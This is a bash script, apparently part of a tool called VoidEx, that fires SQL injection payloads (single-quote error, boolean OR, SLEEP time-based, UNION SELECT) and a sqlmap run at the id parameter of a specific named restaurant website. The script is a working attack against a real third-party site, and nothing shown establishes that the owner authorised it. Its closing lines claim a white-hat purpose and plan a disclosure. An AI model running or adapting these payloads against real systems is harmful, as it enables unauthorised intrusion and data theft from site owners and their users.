#!/bin/bash

# 🛡️ VoidEx SQL Injection Validator for theroyalbihar.com
# Usage: ./validate_sqli_theroyalbihar.sh

TARGET="https://theroyalbihar.com/dining-item.php"
LOG_FILE="sqli_validation_results.txt"

echo "=============================================="
echo "🛡️  VOIDEX SQLi VALIDATOR - theroyalbihar.com"
echo "=============================================="
echo ""

# Test 1: Error-based SQLi (Single Quote)
echo "[TEST 1] Error-based SQLi Detection"
echo "Payload: ?id=5'"
curl -s "${TARGET}?id=5'" 2>&1 | grep -q "Warning: mysqli_fetch_assoc" && echo "✅ VULNERABLE" || echo "❌ NOT VULNERABLE"
echo ""

# Test 2: Boolean-based TRUE
echo "[TEST 2] Boolean-based SQLi (TRUE)"
echo "Payload: ?id=5' OR '1'='1"
curl -s "${TARGET}?id=5' OR '1'='1" 2>&1 | head -20 > /tmp/true_result.txt
echo "✅ Response received"
echo ""

# Test 3: Boolean-based FALSE
echo "[TEST 3] Boolean-based SQLi (FALSE)"
echo "Payload: ?id=5' OR '1'='2"
curl -s "${TARGET}?id=5' OR '1'='2" 2>&1 | head -20 > /tmp/false_result.txt
echo "✅ Response received"
echo ""

# Test 4: Time-based Blind
echo "[TEST 4] Time-based SQLi (5 second delay)"
echo "Payload: ?id=5' AND SLEEP(5)-- -"
start=$(date +%s)
curl -s -m 10 "${TARGET}?id=5' AND SLEEP(5)-- -" > /dev/null 2>&1
end=$(date +%s)
duration=$((end - start))
if [ $duration -ge 5 ]; then
    echo "✅ TIME-BASED VULNERABLE (Response took ${duration}s)"
else
    echo "❌ No time delay detected"
fi
echo ""

# Test 5: UNION-based Column Count
echo "[TEST 5] UNION-based SQLi - Column Count"
echo "Payload: ?id=5' UNION SELECT NULL-- -"
curl -s "${TARGET}?id=5' UNION SELECT NULL-- -" 2>&1 | grep -i "error\|warning" && echo "❌ May need more columns" || echo "✅ Check manually"
echo ""

# Test 6: SQLMap Quick Check
echo "[TEST 6] SQLMap Detection"
echo "Running sqlmap for 30 seconds..."
timeout 30s sqlmap -u "${TARGET}?id=5" --batch --risk=1 --level=2 --technique=BE 2>&1 | grep -E "VULNERABLE|injectable" | head -5
echo ""

echo "=============================================="
echo "📊 VALIDATION COMPLETE"
echo "=============================================="
echo ""
echo "Full Report: /home/kali/gemini/github/voidex-cli_back1/SQLI_THEROYALBIHAR_POC.md"
echo ""
echo "Next Steps:"
echo "1. Review results above"
echo "2. If VULNERABLE, check report for exploit details"
echo "3. Prepare responsible disclosure to admin@theroyalbihar.com"
echo "4. DO NOT exploit further - White hat only!"
echo ""